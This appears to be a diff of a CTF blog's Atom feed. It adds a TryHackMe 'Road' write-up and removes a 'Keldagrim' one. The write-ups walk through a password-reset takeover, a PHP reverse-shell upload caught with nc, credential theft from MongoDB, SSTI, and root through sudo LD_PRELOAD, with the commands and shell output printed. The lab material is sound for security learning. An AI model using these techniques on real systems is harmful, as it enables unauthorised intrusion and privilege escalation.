@@ -1,4 +1,270 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="https://darrynbrownfield.co.uk/feed.xml" rel="self" type="application/atom+xml" /><link href="https://darrynbrownfield.co.uk/" rel="alternate" type="text/html" /><updated>2021-11-07T15:36:06+00:00</updated><id>https://darrynbrownfield.co.uk/</id><title type="html">Darryn Brownfield</title><subtitle>Infosec | Hacking | CTF</subtitle><entry><title type="html">Minotaur’s labyrinth Write Up</title><link href="https://darrynbrownfield.co.uk/minotaurslabyrinth" rel="alternate" type="text/html" title="Minotaur's labyrinth Write Up" /><published>2021-11-07T00:00:00+00:00</published><updated>2021-11-07T00:00:00+00:00</updated><id>https://darrynbrownfield.co.uk/minotaurslabyrinth</id><content type="html" xml:base="https://darrynbrownfield.co.uk/minotaurslabyrinth">&lt;p&gt;&lt;img src=&quot;/assets/images/minotaurslabyrinth/cover.png&quot; alt=&quot;cover&quot; /&gt;&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="https://darrynbrownfield.co.uk/feed.xml" rel="self" type="application/atom+xml" /><link href="https://darrynbrownfield.co.uk/" rel="alternate" type="text/html" /><updated>2021-11-29T11:16:54+00:00</updated><id>https://darrynbrownfield.co.uk/</id><title type="html">Darryn Brownfield</title><subtitle>Infosec | Hacking | CTF</subtitle><entry><title type="html">Road Write Up</title><link href="https://darrynbrownfield.co.uk/road" rel="alternate" type="text/html" title="Road Write Up" /><published>2021-11-29T00:00:00+00:00</published><updated>2021-11-29T00:00:00+00:00</updated><id>https://darrynbrownfield.co.uk/road</id><content type="html" xml:base="https://darrynbrownfield.co.uk/road">&lt;p&gt;&lt;img src=&quot;/assets/images/road/cover.png&quot; alt=&quot;cover&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;overview&quot;&gt;Overview&lt;/h3&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://tryhackme.com/room/road&quot;&gt;Road&lt;/a&gt; is a medium rated CTF room on &lt;a href=&quot;https://tryhackme.com&quot;&gt;TryHackMe&lt;/a&gt; created by &lt;a href=&quot;https://tryhackme.com/p/StillNoob&quot;&gt;StillNoob&lt;/a&gt;. Although rated as medium I would put it down as easy as the *cough* road is nicely laid out for you.&lt;/p&gt;
+
+&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
+
+&lt;p&gt;I started a nmap scan to check for available ports.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $sudo nmap -sC -sV -oA nmap/initial 10.10.149.149
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-29 09:52 GMT
+Nmap scan report for 10.10.149.149
+Host is up (0.055s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 e6:dc:88:69:de:a1:73:8e:84:5b:a1:3e:27:9f:07:24 (RSA)
+|   256 6b:ea:18:5d:8d:c7:9e:9a:01:2c:dd:50:c5:f8:c8:05 (ECDSA)
+|_  256 ef:06:d7:e4:b1:65:15:6e:94:62:cc:dd:f0:8a:1a:24 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Sky Couriers
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 9.04 seconds
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;2 ports open:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;22 - SSH - Openssh 8.2p1&lt;/li&gt;
+  &lt;li&gt;80 - HTTP - Apache httpd 2.4.41&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;I did a second nmap scan on all ports but no other ports were open.&lt;/p&gt;
+
+&lt;h3 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h3&gt;
+
+&lt;p&gt;Taking a look at the web server shows a simple courier web page.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/road/homepage.png&quot; alt=&quot;homepage&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I tested the track order search but it didn’t do anything so I moved on and clicked merchant central which took me to a login form.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/road/login.png&quot; alt=&quot;login&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I tried a few common credentials combinations but had no joy so registered my own account.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/road/createuser.png&quot; alt=&quot;createuser&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Once in I got access to a static dashboard, none of the links on the left worked other than ‘ResetUser’. However I could view my profile.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/road/dashboard.png&quot; alt=&quot;dashboard&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The only option available was to upload an image, however this needs be done my the admin. But now I have the admins email I might be able to use the reset user function to reset the admin’s password.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/road/profile.png&quot; alt=&quot;profile&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;On the ResetUser page the username is grey out but I put in a new password and opened Burp. With Intercept on I submitted the request.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/road/resetuser.png&quot; alt=&quot;resetuser&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;In Burp I can see my account name but no protection mechanisms.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/road/pwreset.png&quot; alt=&quot;pwreset&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I changed the username to the admin account and forward the request.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/road/adminpwreset.png&quot; alt=&quot;adminpwreset&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I now have access to the admin account!&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/road/admindashboard.png&quot; alt=&quot;admindashboard&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;initial-access&quot;&gt;Initial Access&lt;/h3&gt;
+
+&lt;p&gt;Now I have access to the admin account, I should be able to upload a file. The site is using PHP so I tried uploading a php reverse shell. I copied a PHP reverse shell to my directory and edited the IP and port.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $cp /usr/share/webshells/php/php-reverse-shell.php .
+┌─[daz@parrotos]─[~/Documents/TryHackMe/Road]
+└──╼ $mv php-reverse-shell.php shell.php
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I then uploaded the file and started a listener using the command ‘&lt;code class=&quot;highlighter-rouge&quot;&gt;nc -nvlp 4444&lt;/code&gt;’.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/road/upload.gif&quot; alt=&quot;upload&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The profile picture (top right) hasn’t changed or error’d, so I inspect the element to show the src reference.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/road/profilesource.png&quot; alt=&quot;profilesource&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;My upload is not in the assets folder.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/road/assets.png&quot; alt=&quot;assets&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;However, looking at the source code for the profile page ‘http://10.10.149.149/v2/profile.php’ is a comment with a path for profile images.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/road/sourcecode.png&quot; alt=&quot;sourcecode&quot; /&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;blockquote&gt;
+    &lt;blockquote&gt;
+      &lt;p&gt;The first time I scanned the source code I missed the comment, using curl is a quick and crude way of pulling all the comments off a web page which can be useful with a large web page.&lt;/p&gt;
+    &lt;/blockquote&gt;
+  &lt;/blockquote&gt;
+&lt;/blockquote&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $curl -s http://10.10.149.149/v2/profile.php | grep '&amp;lt;!--'
+    &amp;lt;!--&amp;lt;link rel=&quot;stylesheet&quot; href=&quot;../assets/css/bootstrap.min.css&quot; crossorigin=&quot;anonymous&quot;&amp;gt;--&amp;gt;
+  &amp;lt;!-- &amp;lt;script src=&quot;/assets/js/dataTable.min.js&quot;&amp;gt;&amp;lt;/script&amp;gt; --&amp;gt;
+                    &amp;lt;!-- &amp;lt;div class=&quot;alert alert-danger&quot;&amp;gt;Take action&amp;lt;/div&amp;gt; --&amp;gt;
+          &amp;lt;!-- &amp;lt;/ul&amp;gt; --&amp;gt;
+&amp;lt;!-- /v2/profileimages/ --&amp;gt;
+&amp;lt;!-- Include Required Prerequisites --&amp;gt;
+&amp;lt;!-- Include Date Range Picker --&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Going to the path, I can list the images however I know I named my file shell.php so I navigate to ‘http://10.10.149.149/v2/profileimages/shell.php’.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/road/profileimages.png&quot; alt=&quot;profileimages&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I have a shell!&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $nc -nvlp 4444
+listening on [any] 4444 ...
+connect to [10.8.21.217] from (UNKNOWN) [10.10.149.149] 59984
+Linux sky 5.4.0-73-generic #82-Ubuntu SMP Wed Apr 14 17:39:42 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
+ 10:20:14 up 32 min,  0 users,  load average: 0.00, 0.02, 0.12
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id=&quot;priv-esc-1&quot;&gt;Priv Esc 1&lt;/h3&gt;
+
+&lt;p&gt;I got a shell as www-data, I can use this to grab the user.txt flag but I need to now find a way to become the webdeveloper user.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;$ whoami
+www-data
+$ cd /home/
+$ ls
+webdeveloper
+$ cd webdeveloper
+$ ls -lah
+total 36K
+drwxr-xr-x 4 webdeveloper webdeveloper 4.0K Oct  8 10:59 .
+drwxr-xr-x 3 root         root         4.0K May 25  2021 ..
+lrwxrwxrwx 1 webdeveloper webdeveloper    9 May 25  2021 .bash_history -&amp;gt; /dev/null
+-rw-r--r-- 1 webdeveloper webdeveloper  220 Feb 25  2020 .bash_logout
+-rw-r--r-- 1 webdeveloper webdeveloper 3.7K Feb 25  2020 .bashrc
+drwx------ 2 webdeveloper webdeveloper 4.0K May 25  2021 .cache
+drwxrwxr-x 3 webdeveloper webdeveloper 4.0K May 25  2021 .local
+-rw------- 1 webdeveloper webdeveloper   51 Oct  8 10:59 .mysql_history
+-rw-r--r-- 1 webdeveloper webdeveloper  807 Feb 25  2020 .profile
+-rw-r--r-- 1 webdeveloper webdeveloper    0 Oct  7 17:53 .sudo_as_admin_successful
+-rw-r--r-- 1 webdeveloper webdeveloper   33 May 25  2021 user.txt
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I enumerate the box and take a look at the listening ports and find MongoDB is listening on 27017.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;$ ss -tulp
+Netid State  Recv-Q Send-Q      Local Address:Port    Peer Address:Port Process
+udp   UNCONN 0      0           127.0.0.53%lo:domain       0.0.0.0:*           
+udp   UNCONN 0      0      10.10.149.149%eth0:bootpc       0.0.0.0:*           
+tcp   LISTEN 0      511             127.0.0.1:9000         0.0.0.0:*           
+tcp   LISTEN 0      4096            127.0.0.1:27017        0.0.0.0:*           
+tcp   LISTEN 0      151             127.0.0.1:mysql        0.0.0.0:*           
+tcp   LISTEN 0      4096        127.0.0.53%lo:domain       0.0.0.0:*           
+tcp   LISTEN 0      128               0.0.0.0:ssh          0.0.0.0:*           
+tcp   LISTEN 0      70              127.0.0.1:33060        0.0.0.0:*           
+tcp   LISTEN 0      511                     *:http               *:*           
+tcp   LISTEN 0      128                  [::]:ssh             [::]:*           
+$ 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Connecting to mongo I found the webdeveloper credentials, Ive redacted them in the output below.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;$ mongo
+MongoDB shell version v4.4.6
+connecting to: mongodb://127.0.0.1:27017/?compressors=disabled&amp;amp;gssapiServiceName=mongodb
+Implicit session: session { &quot;id&quot; : UUID(&quot;0ad03a25-0c2d-4c46-8adf-bb97086a2f15&quot;) }
+MongoDB server version: 4.4.6
+show dbs
+admin   0.000GB
+backup  0.000GB
+config  0.000GB
+local   0.000GB
+use backup
+switched to db backup
+show collections
+collection
+user
+db.user.find()
+{ &quot;_id&quot; : ObjectId(&quot;60ae2661203d21857b184a76&quot;), &quot;Month&quot; : &quot;Feb&quot;, &quot;Profit&quot; : &quot;25000&quot; }
+{ &quot;_id&quot; : ObjectId(&quot;60ae2677203d21857b184a77&quot;), &quot;Month&quot; : &quot;March&quot;, &quot;Profit&quot; : &quot;5000&quot; }
+{ &quot;_id&quot; : ObjectId(&quot;60ae2690203d21857b184a78&quot;), &quot;Name&quot; : &quot;webdeveloper&quot;, &quot;Pass&quot; : &quot;&quot; }
+{ &quot;_id&quot; : ObjectId(&quot;60ae26bf203d21857b184a79&quot;), &quot;Name&quot; : &quot;Rohit&quot;, &quot;EndDate&quot; : &quot;December&quot; }
+{ &quot;_id&quot; : ObjectId(&quot;60ae26d2203d21857b184a7a&quot;), &quot;Name&quot; : &quot;Rohit&quot;, &quot;Salary&quot; : &quot;30000&quot; }
+exit
+bye
+Error saving history file: FileOpenFailed Unable to open() file /var/www/.dbshell: Permission denied
+$ 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I can now SSH in to the machine as webdeveloper.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $ssh webdeveloper@10.10.149.149
+The authenticity of host '10.10.149.149 (10.10.149.149)' can't be established.
+ECDSA key fingerprint is SHA256:zSoCEcBBY73hNL9ItPA4CnB/405/W6GQYsl94qRMkOo.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.149.149' (ECDSA) to the list of known hosts.
+webdeveloper@10.10.149.149's password: 
+Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-73-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Mon 29 Nov 2021 10:26:45 AM UTC
+
+  System load:  0.0               Processes:             121
+  Usage of /:   60.0% of 9.78GB   Users logged in:       0
+  Memory usage: 63%               IPv4 address for eth0: 10.10.149.149
+  Swap usage:   0%
+
+
+185 updates can be installed immediately.
+100 of these updates are security updates.
+To see these additional updates run: apt list --upgradable
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+Last login: Fri Oct  8 10:52:42 2021 from 192.168.0.105
+webdeveloper@sky:~$ 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id=&quot;priv-esc-2&quot;&gt;Priv Esc 2&lt;/h3&gt;
+
+&lt;p&gt;Once connected as webdeveloper I did ‘&lt;code class=&quot;highlighter-rouge&quot;&gt;sudo -l&lt;/code&gt;’, there is a binary the user can run that could be vulnerable however LD_PRELOAD is configured which could also provide a path to priv esc.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;webdeveloper@sky:~$ sudo -l
+Matching Defaults entries for webdeveloper on sky:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD
+
+User webdeveloper may run the following commands on sky:
+    (ALL : ALL) NOPASSWD: /usr/bin/sky_backup_utility
+webdeveloper@sky:~$                                                                    
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Using the &lt;a href=&quot;https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/&quot;&gt;article&lt;/a&gt; at Hacking Articles provides a great step by step on how to exploit this. I created the shell.c file as per the article and run the sudo command to become root!&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;webdeveloper@sky:/tmp$ gcc -fPIC -shared -o shell.so shell.c -nostartfiles
+webdeveloper@sky:/tmp$ sudo LD_PRELOAD=/tmp/shell.so /usr/bin/sky_backup_utility
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# whoami
+root
+# 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Thanks for reading!&lt;/p&gt;</content><author><name>Darryn</name></author><category term="tryhackme" /><category term="ctf" /><category term="medium" /><summary type="html"></summary></entry><entry><title type="html">Minotaur’s labyrinth Write Up</title><link href="https://darrynbrownfield.co.uk/minotaurslabyrinth" rel="alternate" type="text/html" title="Minotaur's labyrinth Write Up" /><published>2021-11-07T00:00:00+00:00</published><updated>2021-11-07T00:00:00+00:00</updated><id>https://darrynbrownfield.co.uk/minotaurslabyrinth</id><content type="html" xml:base="https://darrynbrownfield.co.uk/minotaurslabyrinth">&lt;p&gt;&lt;img src=&quot;/assets/images/minotaurslabyrinth/cover.png&quot; alt=&quot;cover&quot; /&gt;&lt;/p&gt;
 
 &lt;h3 id=&quot;overview&quot;&gt;Overview&lt;/h3&gt;
 
@@ -2512,141 +2778,4 @@ uid=0(root) gid=0(root) groups=0(root)
 dailybugle
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;p&gt;Thanks for reading!&lt;/p&gt;</content><author><name>Darryn</name></author><category term="tryhackme" /><category term="ctf" /><category term="hard" /><category term="oscp" /><summary type="html"></summary></entry><entry><title type="html">Keldagrim Write Up</title><link href="https://darrynbrownfield.co.uk/keldagrim" rel="alternate" type="text/html" title="Keldagrim Write Up" /><published>2021-03-06T00:00:00+00:00</published><updated>2021-03-06T00:00:00+00:00</updated><id>https://darrynbrownfield.co.uk/keldagrim</id><content type="html" xml:base="https://darrynbrownfield.co.uk/keldagrim">&lt;p&gt;&lt;img src=&quot;/assets/images/keldagrim/cover.png&quot; alt=&quot;keldagrim&quot; /&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;overview&quot;&gt;Overview&lt;/h3&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://tryhackme.com/room/keldagrim&quot;&gt;Keldagrim&lt;/a&gt; is a medium level CTF room on &lt;a href=&quot;https://tryhackme.com&quot;&gt;TryHackMe&lt;/a&gt; created by &lt;a href=&quot;https://twitter.com/optionalctf&quot;&gt;Optional&lt;/a&gt;.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Can you overcome the forge and steal all of the gold!&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
-
-&lt;p&gt;I deployed the machine and was given the target IP 10.10.252.142 I started a nmap scan to check the available ports.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $sudo nmap -sC -sV -oN nmap/initial 10.10.252.142
-Starting Nmap 7.80 ( https://nmap.org ) at 2021-03-06 13:03 GMT
-Nmap scan report for 10.10.252.142
-Host is up (0.030s latency).
-Not shown: 998 closed ports
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   2048 d8:23:24:3c:6e:3f:5b:b0:ec:42:e4:ce:71:2f:1e:52 (RSA)
-|   256 c6:75:e5:10:b4:0a:51:83:3e:55:b4:f6:03:b5:0b:7a (ECDSA)
-|_  256 4c:51:80:db:31:4c:6a:be:bf:9b:48:b5:d4:d6:ff:7c (ED25519)
-80/tcp open  http    Werkzeug httpd 1.0.1 (Python 3.6.9)
-| http-cookie-flags: 
-|   /: 
-|     session: 
-|_      httponly flag not set
-|_http-server-header: Werkzeug/1.0.1 Python/3.6.9
-|_http-title:  Home page 
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 8.63 seconds
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;2 Ports open:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;22 - SSH - Banner is showing its an Ubuntu machine&lt;/li&gt;
-  &lt;li&gt;80 - HTTP - Werkzeug httpd 1.0.1&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;I also ran a full port scan but no additional ports were found.&lt;/p&gt;
-
-&lt;h3 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h3&gt;
-
-&lt;p&gt;I opened up my browser and started to have a look at the web page.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/keldagrim/webpage.png&quot; alt=&quot;webpage&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Nothing really stood out however when I looked at the source code I could see a disabled link to /admin&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;    &amp;lt;li class=&quot;nav-item dropdown&quot;&amp;gt;
-        &amp;lt;a class=&quot;nav-link dropdown-toggle&quot; href=&quot;#&quot; id=&quot;navbarDropdown&quot; role=&quot;button&quot; data-toggle=&quot;dropdown&quot; aria-haspopup=&quot;true&quot; aria-expanded=&quot;false&quot;&amp;gt;
-          Buy Gold
-        &amp;lt;/a&amp;gt;
-        &amp;lt;div class=&quot;dropdown-menu&quot; aria-labelledby=&quot;navbarDropdown&quot;&amp;gt;
-            &amp;lt;a class=&quot;dropdown-item&quot; href=&quot;/wow&quot;&amp;gt;World of Warcraft&amp;lt;/a&amp;gt;
-            &amp;lt;a class=&quot;dropdown-item&quot; href=&quot;/OSRunescape&quot;&amp;gt;Old School Runescape&amp;lt;/a&amp;gt;
-            &amp;lt;a class=&quot;dropdown-item&quot; href=&quot;/runescape&quot;&amp;gt;Runescape3&amp;lt;/a&amp;gt;
-          &amp;lt;div class=&quot;dropdown-divider&quot;&amp;gt;&amp;lt;/div&amp;gt;
-          &amp;lt;a class=&quot;dropdown-item &quot; href=&quot;/admin&quot;&amp;gt;Admin&amp;lt;/a&amp;gt;
-        &amp;lt;/div&amp;gt;
-      &amp;lt;/li&amp;gt;
-&amp;lt;/ul&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;However the page looks pretty much the same. So I looked at cookies and found a session cooke with a base64 value.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/keldagrim/guest.png&quot; alt=&quot;guest&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;There are lots of ways to change the base64 to plaintext but I really like &lt;a href=&quot;https://gchq.github.io/CyberChef/&quot;&gt;CyberChef&lt;/a&gt; at the moment. Using CyberChef I was able to see the value was ‘guest’.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/keldagrim/cyberchef.png&quot; alt=&quot;cyberchef&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;I used CyberChef again to encode ‘admin’ in to base64.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/keldagrim/adminhash.png&quot; alt=&quot;adminhash&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Simply changing the session cookie value to the base64 output and refreshing the page now allowed me to see - ‘Current user - $2,165’ and be provided with a sales cookie.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/keldagrim/sales.png&quot; alt=&quot;sales&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;This was also base64 encoded, CyberChef has a great feature called ‘Magic’, if you are unsure how something is encoded use magic to suggest and test various operations.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/keldagrim/saleshash.png&quot; alt=&quot;saleshash&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;This next bit took some time, I was able to base64 a string and input it in to the sales cookie and it would be displayed on the webpage, however I was unsure how I would be able to use this to get a foothold on the box. After some googling, I tried a technique called Server Side Template Injection (SSTI). This was not something I had tried to exploit before so I did some research on the technique to try and understand it and used &lt;a href=&quot;https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection&quot;&gt;PayloadsAllTheThings&lt;/a&gt; to see if I was on the right track.&lt;/p&gt;
-
-&lt;p&gt;I found a payload {{7*'7’}} and if I had SSTI that should result in 7777777. I encoded the payload in base64 and updated the sales cookie with the output.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/keldagrim/sstipayload.png&quot; alt=&quot;sstipayload&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Refreshed the page and confirmed I had SSTI in the sales cookie!&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/keldagrim/ssti.png&quot; alt=&quot;ssti&quot; /&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;initial-access&quot;&gt;Initial Access&lt;/h3&gt;
-
-&lt;p&gt;On the same &lt;a href=&quot;https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection&quot;&gt;PayloadsAllTheThings&lt;/a&gt; page was an example for remote code execution. I took the example for exploiting an SSTI by calling Popen without guessing the offset, changed the IP and port values and encoded again with base64.&lt;/p&gt;
-
-&lt;p&gt;I opened a nc listener and updated the sales cookie with the base64 output and got a shell!&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $nc -nvlp 4444
-listening on [any] 4444 ...
-connect to [10.8.21.217] from (UNKNOWN) [10.10.252.142] 36928
-/bin/sh: 0: can't access tty; job control turned off
-$ whoami
-jed
-$ 
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h3 id=&quot;priv-esc&quot;&gt;Priv Esc&lt;/h3&gt;
-
-&lt;p&gt;Now to get root i checked ‘sudo -l’.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;$ sudo -l
-Matching Defaults entries for jed on keldagrim:
-    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD
-
-User jed may run the following commands on keldagrim:
-    (ALL : ALL) NOPASSWD: /bin/ps
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;I had a look at &lt;a href=&quot;https://gtfobins.github.io/&quot;&gt;GTFOBins&lt;/a&gt; for ‘/bin/ps’ but as expected I didn’t find anything, I also noticed ‘env_keep+=LD_PRELOAD’. There is a great course by &lt;a href=&quot;https://twitter.com/thecybermentor&quot;&gt;Heath Adams&lt;/a&gt; on &lt;a href=&quot;https://www.udemy.com/course/linux-privilege-escalation-for-beginners&quot;&gt;udemy&lt;/a&gt; for Linux privesc techinques and this is covered as part of the course. There is also a great &lt;a href=&quot;https://touhidshaikh.com/blog/2018/04/12/sudo-ld_preload-linux-privilege-escalation/&quot;&gt;article&lt;/a&gt; which covers it.&lt;/p&gt;
-
-&lt;p&gt;I used the steps in the article to create a file called evil.c, compiled with GCC. Ran the sudo command with LD_PRELOAD and got root!&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;jed@keldagrim:/dev/shm$ sudo LD_PRELOAD=/dev/shm/evil.so ps
-root@keldagrim:/dev/shm# id
-uid=0(root) gid=0(root) groups=0(root)
-root@keldagrim:/dev/shm# 
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Thanks for reading!&lt;/p&gt;</content><author><name>Darryn</name></author><category term="tryhackme" /><category term="ctf" /><category term="medium" /><summary type="html"></summary></entry></feed>
+&lt;p&gt;Thanks for reading!&lt;/p&gt;</content><author><name>Darryn</name></author><category term="tryhackme" /><category term="ctf" /><category term="hard" /><category term="oscp" /><summary type="html"></summary></entry></feed>
